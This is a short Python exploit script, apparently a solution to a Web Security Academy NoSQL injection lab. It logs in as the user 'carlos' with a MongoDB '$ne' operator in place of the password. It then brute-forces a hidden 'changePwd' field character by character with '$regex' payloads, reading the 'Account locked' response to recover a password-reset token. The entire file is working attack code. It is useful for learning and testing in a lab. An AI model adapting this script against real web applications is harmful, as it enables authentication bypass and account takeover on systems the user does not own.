import grequests
from string import ascii_lowercase, ascii_uppercase, digits

url = "https://0a1300d704fa403d8409dc3a000b007b.web-security-academy.net/login"

data_json = {
    "username": "carlos",
    "password": {"$ne":"hello"},
}

token = "a19bcb23757"
init_token = token
charlist = "_-" + ascii_lowercase + digits + ascii_uppercase

while True:
    req_pool=[]
    for c in charlist:
        attempt = token + c
        data_json["changePwd"] = {"$regex": attempt + ".*"}
        print(data_json)
        req = grequests.post(url, json=data_json, allow_redirects=False)
        req_pool.append(req)

    responses = grequests.map(req_pool)

    print(responses)
    print(responses[0].text)

    for i, res in enumerate(responses):
        if "Account locked" in res.text:
            print(res.text)
            token += charlist[i]
            print(token)
            break
    
    if token == init_token:
        break

